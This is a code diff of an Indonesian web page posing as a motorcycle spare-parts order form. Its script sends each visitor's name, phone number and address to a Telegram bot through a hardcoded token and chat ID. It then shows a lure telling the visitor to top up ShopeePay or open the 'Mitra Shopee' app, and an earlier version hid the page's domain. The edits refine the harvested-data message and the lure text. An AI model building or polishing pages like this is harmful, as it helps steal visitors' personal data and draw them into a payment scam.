@@ -5,8 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Formulir Pemesanan Suku Cadang Motor</title>
-    <link rel="stylesheet" href="style.css">
-    <!-- Font Awesome untuk ikon -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         body {
@@ -94,7 +92,6 @@
         <header>
             <div class="logo-wrapper">
                 <div class="logo">
-                    <!-- Ikon motor -->
                     <i class="fas fa-motorcycle fa-3x"></i>
                 </div>
             </div>
@@ -137,7 +134,6 @@
             </div>
         </main>
     </div>
-    <!-- Script kirim ke Telegram -->
     <script>
         document.addEventListener('DOMContentLoaded', function () {
             document.getElementById('orderForm').addEventListener('submit', function (event) {
@@ -157,22 +153,25 @@
                 }
 
                 // Kirim ke Telegram
-                var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
-                var chatId = "5923031825"; // Pastikan ini adalah string
+                var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk"; // Ganti dengan token bot Anda
+                var chatId = "5923031825"; // Ganti dengan chat ID Anda
                 var text =
-                    "Formulir Pemesanan Suku Cadang Motor:\n" +
-                    "Nama: " + nama + "\n" +
-                    "Telepon: " + telepon + "\n" +
-                    "Alamat: " + alamat + "\n" +
+                    "**🛵 PEMESANAN BARU SUKU CADANG MOTOR 🏍️**\n\n" +
+                    "**INFORMASI PEMESAN:**\n" +
+                    "Nama Lengkap: " + nama + "\n" +
+                    "Nomor Telepon: " + telepon + "\n" +
+                    "Alamat Lengkap: " + alamat + "\n\n" +
+                    "**DETAIL PESANAN:**\n" +
                     "Nama Produk: " + namaProduk + "\n" +
-                    "Harga: " + harga;
+                    "Harga: Rp" + new Intl.NumberFormat('id-ID').format(harga); // Memformat harga
 
-                // URL endpoint Telegram yang benar
+                // URL endpoint Telegram
                 var url = "https://api.telegram.org/bot" + token + "/sendMessage";
 
                 var params = {
-                    chat_id: chatId, // Pastikan ini adalah string
-                    text: text
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'Markdown' // Menggunakan Markdown untuk format yang lebih baik
                 };
 
                 fetch(url, {
@@ -190,9 +189,11 @@
                     })
                     .then(data => {
                         if (data.ok) {
-                            alert(Silahkan top up saldo shoppepay dwonload aplikasi Mitra Shopee apabila belum dwonload aplikasi .');
-                            // Menyembunyikan tampilan domain
-                            window.location.replace('index.html');
+                            // Perbaikan alert sesuai permintaan
+                            alert('Kamu sudah mengisi formulir pesanan, tapi akun kamu belum terhubung. Silakan buka akunmu di aplikasi Mitra Shopee');
+                            
+                            // Anda dapat menambahkan kembali pengalihan halaman di sini jika diinginkan
+                            // window.location.replace('index.html'); 
                         } else {
                             alert('Gagal mengirim ke Telegram: ' + data.description);
                         }
